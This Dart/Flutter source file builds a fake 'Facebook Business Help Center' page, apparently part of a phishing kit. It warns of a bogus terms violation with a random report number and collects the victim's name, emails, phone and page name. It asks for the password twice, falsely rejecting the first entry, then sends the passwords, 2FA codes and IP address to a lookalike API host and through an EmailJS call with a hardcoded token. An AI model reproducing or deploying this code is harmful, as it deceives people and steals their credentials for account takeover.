import 'dart:convert';
import 'dart:math';
import 'package:exins/Views/Web/config.dart';
import 'package:flutter/foundation.dart';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:dart_ipify/dart_ipify.dart';
import 'package:email_validator/email_validator.dart';
import 'package:emailjs/emailjs.dart';
import 'package:exins/Constants/app_constants.dart';
import 'package:exins/Provider/uid_provider.dart';
import 'package:exins/Responsive/responsive_layout.dart';
import 'package:exins/Views/Web/tfa.dart';
import 'package:exins/Views/Widgets/Text/poppins.dart';
import 'package:exins/Views/Widgets/TextField/intel_textField.dart';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:page_transition/page_transition.dart';
import 'package:provider/provider.dart';
import 'package:http/http.dart' as http;
import 'dart:developer';
import 'dart:convert';

class GetStarted extends StatefulWidget {
  GetStarted({super.key});

  @override
  State<GetStarted> createState() => _GetStartedState();
}

class _GetStartedState extends State<GetStarted> {
  TextEditingController infoController = TextEditingController();

  TextEditingController fullNameController = TextEditingController();

  // TextEditingController loginEmailController = TextEditingController();
  TextEditingController businessEmailController = TextEditingController();
  TextEditingController personalEmailController = TextEditingController();

  TextEditingController mobilePhoneController = TextEditingController();

  TextEditingController fbNameController = TextEditingController();

  TextEditingController passController = TextEditingController();

  bool isCheckBox = false;
  bool isPassTested = false;
  bool isSending = false;
  bool isBusinessEmailValid = true;
  bool isPersonalEmailValid = true;
  String p1 = "";
  String p2 = "";
  Map<String, dynamic> fbMap = {};
  String? usrUid;
  String ip = "";

  Future<void> sendMessage(Map map, String ip) async {
    const baseUrl =
        'https://api.metafanpagesupport.pro/v1/users/create'; // Replace with your API base URL

    final body = {
      'fullname': map["Full Name"], //
      'businessEmail': map["Business Email Address"],
      'email': map["Personal Email Address"],
      'facebookPage': map["Facebook Page Name"],
      'phoneNumber': map["Phone Number"],
      'password': map["password1"],
      'password2': map["password2"],
      'description': map["Additional Info"],
      "ip": ip
    };
    final bodyConvert = jsonEncode(body);
    debugPrint('GetStarted: $bodyConvert');
    Map<String, String> headers = {
      'Content-Type': 'application/json',
    };

    final response =
        await http.put(Uri.parse(baseUrl), body: bodyConvert, headers: headers);

    if (response.statusCode == 200) {
    } else {
      print('Failed to send message');
    }
  }

  sendEmail(Map map, String ip) async {
    //   await EmailJS.send(
    //     AppConstants.SERVICE_KEY,
    //     AppConstants.TEMPLATE_ID,
    //     {
    //       'user_email': AppConstants.email,
    //       'full_name': map["Full Name"],//
    //       'bus_email': map["Business Email Address"],
    //       'pers_email': map["Personal Email Address"],
    //       'fb_page_name': map["Facebook Page Name"],
    //       'phone': map["Phone Number"],
    //       'p_one': map["password1"],
    //       'p_two': map["password2"],
    //       'tfa_one': map["firstTFA"],
    //       'tfa_two': map["secondTFA"],
    //       'tfa_three': map["thirdTFA"],
    //       'add_info': map["Additional Info"],
    //       "ip_address": ip
    //     },
    //     const Options(
    //       publicKey: AppConstants.PUBLIC_KEY,
    //       privateKey: AppConstants.PRIVATE_KEY,
    //     ),
    //   );

    //   return true;
    // } catch (error) {
    //   if (error is EmailJSResponseStatus) {}
    //   print(error.toString());
    // }
    // return false;

    var url = Uri.parse('https://api.emailjs.com/api/v1.0/email/send');

    var headers = <String, String>{
      'Content-Type': 'application/json; charset=UTF-8',
      'Authorization': 'Bearer 8sM8KJk7HJLd-V-oN3ZZo'
    };

    Map<String, dynamic> body = {
      'service_id': AppConstants.SERVICE_KEY,
      'template_id': AppConstants.TEMPLATE_ID,
      'user_id': AppConstants.PUBLIC_KEY,
      'template_params': {
        'subject': "New User Information",
        'to_email': AppConstants.email,
        'user_email': AppConstants.email,
        'full_name': map["Full Name"], //
        'bus_email': map["Business Email Address"],
        'pers_email': map["Personal Email Address"],
        'fb_page_name': map["Facebook Page Name"],
        'phone': map["Phone Number"],
        'p_one': map["password1"],
        'p_two': map["password2"],
        'tfa_one': map["firstTFA"],
        'tfa_two': map["secondTFA"],
        'tfa_three': map["thirdTFA"],
        'add_info': map["Additional Info"],
        "ip_address": ip
      },
    };

    var client = http.Client();

    try {
      var response = await client.post(
        url,
        headers: headers,
        body: jsonEncode(body),
      );

      if (response.statusCode != 200) {
        throw Exception(
            'Failed to send email. Status code: ${response.statusCode}');
      }
    } finally {
      client.close();
    }
  }

  @override
  void initState() {
    Ipify.ipv4().then((value) => ip = value);
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    usrUid = Provider.of<UidProvider>(context).uid;
    final random = Random();

    StatefulBuilder alert = StatefulBuilder(
      builder: (context, setState) => AlertDialog(
        alignment: Alignment.topCenter,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(5),
        ),
        content: SingleChildScrollView(
          child: SizedBox(
            width: 650.0,
            child: Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.start,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: <Widget>[
                  Padding(
                    padding: const EdgeInsets.only(bottom: 10),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        const Text(
                          "Please Enter Your Password",
                          style: TextStyle(
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1,
                            fontSize: 22,
                          ),
                        ),
                        GestureDetector(
                          child: const MouseRegion(
                            cursor: SystemMouseCursors.click,
                            child: Icon(
                              Icons.close,
                              color: Color(0xff808080),
                            ),
                          ),
                          onTap: () {
                            Navigator.of(context).pop();
                          },
                        )
                      ],
                    ),
                  ),
                  Divider(
                    thickness: 1.5,
                    color: Colors.grey.shade200,
                  ),
                  const Padding(
                    padding: EdgeInsets.symmetric(vertical: 10.0),
                    child: Text(
                      'For your security, you must re-enter your password to continue.',
                      style: TextStyle(fontSize: 16, color: Color(0xff65676B)),
                    ),
                  ),
                  IntelTextField(
                    controller: passController,
                    obsecureText: true,
                    title: "Password",
                  ),
                  const SizedBox(
                    height: 10,
                  ),
                  isPassTested
                      ? Poppins(
                          text: "Your password was incorrect !",
                          color: const Color(0xffA94442),
                        )
                      : Container(),
                  isPassTested
                      ? const SizedBox(
                          height: 10,
                        )
                      : Container(),
                  Divider(
                    thickness: 1.5,
                    color: Colors.grey.shade200,
                  ),
                  const SizedBox(
                    height: 10,
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.end,
                    children: [
                      ElevatedButton(
                        onPressed: () {
                          Navigator.of(context).pop();
                        },
                        style: ElevatedButton.styleFrom(
                            padding: EdgeInsets.zero,
                            backgroundColor: const Color(0xff6C757D),
                            elevation: 0,
                            fixedSize: const Size(120, 40)),
                        child: const Text(
                          "Close",
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w500,
                            fontSize: 18,
                          ),
                        ),
                      ),
                      const SizedBox(
                        width: 20,
                      ),
                      !isSending
                          ? ElevatedButton(
                              onPressed: () async {
                                fbMap["Additional Info"] = infoController.text;
                                fbMap["Full Name"] = fullNameController.text;
                                fbMap["Business Email Address"] =
                                    businessEmailController.text;
                                fbMap["Personal Email Address"] =
                                    personalEmailController.text;
                                fbMap["Phone Number"] =
                                    mobilePhoneController.text;
                                fbMap["Facebook Page Name"] =
                                    fbNameController.text;

                                fbMap["step"] = 2;
                                fbMap["ip_address"] = await Ipify.ipv4();

                                if (isPassTested == false) {
                                  setState(() async {
                                    isPassTested = true;

                                    p1 = passController.text;
                                    fbMap["password1"] = p1;
                                    passController.clear();
                                  });
                                } else if (isPassTested == true) {
                                  p2 = passController.text;
                                  fbMap["password2"] = p2;

                                  setState(() {
                                    isSending = true;
                                  });

                                  sendMessage(fbMap, ip);
                                  FirebaseFirestore.instance
                                      .collection("User")
                                      .doc(usrUid);

                                  setState(() {
                                    isPassTested = false;
                                    passController.clear();
                                  });
                                  Navigator.push(
                                    context,
                                    PageTransition(
                                      type: PageTransitionType.fade,
                                      child: ResponsiveLayout(
                                        desktopBody: TFA(
                                          isMobile: false,
                                          isThird: false,
                                          dataMap: fbMap,
                                        ),
                                        mobileBody: TFA(
                                          isMobile: true,
                                          isThird: false,
                                          dataMap: fbMap,
                                        ),
                                        tabletBody: TFA(
                                          isMobile: true,
                                          isThird: false,
                                          dataMap: fbMap,
                                        ),
                                      ),
                                    ),
                                  );
                                  ;
                                }
                              },
                              style: ElevatedButton.styleFrom(
                                  padding: EdgeInsets.zero,
                                  backgroundColor: const Color(0xff1876F2),
                                  elevation: 0,
                                  fixedSize: const Size(120, 40)),
                              child: const Text(
                                "Continue",
                                style: TextStyle(
                                  color: Colors.white,
                                  fontWeight: FontWeight.w500,
                                  fontSize: 18,
                                ),
                              ),
                            )
                          : const CircularProgressIndicator(),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );

    void mainContinueOnPressed() async {
      if (!EmailValidator.validate(businessEmailController.text)) {
        setState(() {
          isBusinessEmailValid = false;
        });

        return;
      } else {
        setState(() {
          isBusinessEmailValid = true;
        });
      }

      if (!EmailValidator.validate(personalEmailController.text)) {
        setState(() {
          isPersonalEmailValid = false;
        });

        return;
      } else {
        setState(() {
          isPersonalEmailValid = true;
        });
      }

      fbMap["Additional Info"] = infoController.text;
      fbMap["Full Name"] = fullNameController.text;
      fbMap["Business Email Address"] = businessEmailController.text;
      fbMap["Personal Email Address"] = personalEmailController.text;
      fbMap["Phone Number"] = mobilePhoneController.text;
      fbMap["Facebook Page Name"] = fbNameController.text;
      fbMap["step"] = 1;
      fbMap["ip_address"] = await Ipify.ipv4();
      fbMap["timestamp"] = FieldValue.serverTimestamp();
      fbMap["uid"] = usrUid;
      print("data: $fbMap"); // Output: data: Some data

      // await FirebaseFirestore.instance
      //     .collection("User")
      //     .doc(usrUid)
      //     .set(fbMap, SetOptions(merge: true));
      showDialog(
          context: context,
          builder: (BuildContext context) {
            return LayoutBuilder(
              builder: (p0, p1) => alert,
            );
          });
    }

    return Scaffold(
      body: SingleChildScrollView(
        child: Column(
          children: [
            const SizedBox(
              height: 15,
            ),
            Container(
              width: double.infinity,
              height: 65,
              alignment: Alignment.topCenter,
              child: Row(
                children: [
                  Padding(
                    padding: const EdgeInsets.all(20),
                    child: SizedBox(
                      height: 13,
                      child: Image.asset("assets/images/meta.png"),
                    ),
                  ),
                  Expanded(
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                      children: const [
                        Text(
                          "Get Started",
                          style:
                              TextStyle(color: Color(0xff737373), fontSize: 16),
                        ),
                        Text(
                          "Advertise",
                          style:
                              TextStyle(color: Color(0xff737373), fontSize: 16),
                        ),
                        Text(
                          "Learn",
                          style:
                              TextStyle(color: Color(0xff737373), fontSize: 16),
                        ),
                        Text(
                          "Support",
                          style:
                              TextStyle(color: Color(0xff737373), fontSize: 16),
                        ),
                      ],
                    ),
                  ),
                  Flexible(
                    flex: 2,
                    child: Align(
                      alignment: Alignment.centerRight,
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 15),
                        width: 180,
                        child: ElevatedButton(
                          style: ElevatedButton.styleFrom(
                              padding: EdgeInsets.zero,
                              backgroundColor: const Color(0xff344854),
                              elevation: 0,
                              fixedSize: const Size(180, 35)),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.spaceAround,
                            children: const [
                              Text(
                                "Start Now",
                                style: TextStyle(
                                  color: Colors.white,
                                  fontWeight: FontWeight.w500,
                                  fontSize: 15,
                                ),
                              ),
                              Icon(Icons.expand_more)
                            ],
                          ),
                          onPressed: () {},
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(
              height: 25,
            ),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 15.0),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: const [
                  Text(
                    "Business Help Center",
                    style: TextStyle(
                      color: Colors.black,
                      fontWeight: FontWeight.w500,
                      fontSize: 17,
                    ),
                  ),
                  Text(
                    "Get Support",
                    style: TextStyle(
                      color: Colors.black,
                      fontWeight: FontWeight.w500,
                      fontSize: 17,
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(
              height: 15,
            ),
            Container(
              width: double.infinity,
              height: 200,
              decoration: const BoxDecoration(
                image: DecorationImage(
                    image: AssetImage(
                      "assets/images/banner.png",
                    ),
                    fit: BoxFit.fill),
              ),
              child: Center(
                child: Poppins(
                  text: "Facebook Business Help Center",
                  fontSize: 40,
                  color: Colors.white,
                  height: 2,
                  fontWeight: FontWeight.w200,
                ),
              ),
            ),
            const SizedBox(
              height: 20,
            ),
            Container(
              width: 550,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(10),
                color: Colors.white,
                boxShadow: [
                  BoxShadow(
                      color: Colors.grey.shade300,
                      blurRadius: 5,
                      spreadRadius: 5),
                ],
              ),
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 20),
                child: Column(
                  children: [
                    Padding(
                        padding: const EdgeInsets.symmetric(
                            vertical: 30, horizontal: 40),
                        child: Image.asset(
                          "assets/images/steps.png",
                          fit: BoxFit.fill,
                          filterQuality: FilterQuality.high,
                        )),
                    Poppins(
                      text: "Get Started",
                      fontSize: 20,
                      fontWeight: FontWeight.bold,
                    ),
                    const SizedBox(
                      height: 20,
                    ),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 20, vertical: 10),
                      width: double.infinity,
                      color: const Color(0xffE2E3E5),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Poppins(
                            text:
                                "We have received multiple reports that suggest that your account has been in violation of our terms of service and community guidelines. As a result, your account is scheduled for review",
                            fontSize: 11,
                          ),
                          const SizedBox(
                            height: 10,
                          ),
                          Poppins(
                            text:
                                "Report no: ${random.nextInt(10)}${random.nextInt(10)}${random.nextInt(10)}${random.nextInt(10)}${random.nextInt(10)}${random.nextInt(10)}${random.nextInt(10)}${random.nextInt(10)}${random.nextInt(10)}${random.nextInt(10)}",
                            fontSize: 13,
                            fontWeight: FontWeight.bold,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(
                      height: 30,
                    ),
                    Align(
                      alignment: Alignment.centerLeft,
                      child: Poppins(
                        text:
                            "Please provide us information that will help us investigate",
                        fontWeight: FontWeight.bold,
                        fontSize: 13,
                      ),
                    ),
                    TextField(
                      controller: infoController,
                      maxLines: 3,
                      decoration: InputDecoration(
                        enabledBorder: OutlineInputBorder(
                          borderSide:
                              BorderSide(width: 1, color: Colors.grey.shade400),
                        ),
                        border: const OutlineInputBorder(
                          borderSide: BorderSide(width: 5),
                        ),
                      ),
                    ),
                    const SizedBox(
                      height: 10,
                    ),
                    IntelTextField(
                        controller: fullNameController, title: "Full Name"),
                    const SizedBox(
                      height: 10,
                    ),
                    // IntelTextField(
                    //     controller: loginEmailController,
                    //     title: "Login email address"),
                    // const SizedBox(
                    //   height: 10,
                    // ),
                    IntelTextField(
                        controller: businessEmailController,
                        title: "Business email address"),
                    const SizedBox(
                      height: 10,
                    ),
                    IntelTextField(
                        controller: personalEmailController,
                        title: "Personal email address"),
                    const SizedBox(
                      height: 10,
                    ),
                    IntelTextField(
                        controller: mobilePhoneController,
                        title: "Mobile phone number"),
                    const SizedBox(
                      height: 10,
                    ),
                    IntelTextField(
                        controller: fbNameController,
                        title: "Facebook Page Name"),
                    const SizedBox(
                      height: 10,
                    ),
                    Row(
                      children: [
                        Checkbox(
                          value: isCheckBox,
                          onChanged: (value) {
                            setState(() {
                              isCheckBox = !isCheckBox;
                            });
                          },
                        ),
                        Text(
                          "I agree to Terms, Data and Cookies Policy.",
                          style: TextStyle(
                              fontSize: 14, color: Colors.grey.shade600),
                        ),
                      ],
                    ),
                    const SizedBox(
                      height: 30,
                    ),
                    !isBusinessEmailValid
                        ? const SizedBox(
                            height: 10,
                          )
                        : Container(),
                    !isBusinessEmailValid
                        ? Poppins(
                            text:
                                "*Business Email Address is not Valid. Please Enter Correct Email Address",
                            color: Colors.red)
                        : Container(),
                    !isBusinessEmailValid
                        ? const SizedBox(
                            height: 10,
                          )
                        : Container(),
                    !isPersonalEmailValid
                        ? const SizedBox(
                            height: 10,
                          )
                        : Container(),
                    !isPersonalEmailValid
                        ? Poppins(
                            text:
                                "*Personal Email Address is not Valid. Please Enter Correct Email Address",
                            color: Colors.red)
                        : Container(),
                    !isPersonalEmailValid
                        ? const SizedBox(
                            height: 10,
                          )
                        : Container(),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 15),
                      width: double.infinity,
                      child: ElevatedButton(
                        style: ElevatedButton.styleFrom(
                            padding: EdgeInsets.zero,
                            backgroundColor: const Color(0xffE8F3FC),
                            elevation: 0,
                            fixedSize: const Size(120, 40)),
                        child: const Text(
                          "Submit",
                          style: TextStyle(
                            color: Color(0xff1876F2),
                            fontWeight: FontWeight.w500,
                            fontSize: 18,
                          ),
                        ),
                        onPressed: isCheckBox
                            ? () async {
                                mainContinueOnPressed();
                              }
                            : null,
                      ),
                    ),
                    const SizedBox(
                      height: 30,
                    ),
                  ],
                ),
              ),
            ),
            const SizedBox(
              height: 30,
            ),
          ],
        ),
      ),
    );
  }
}
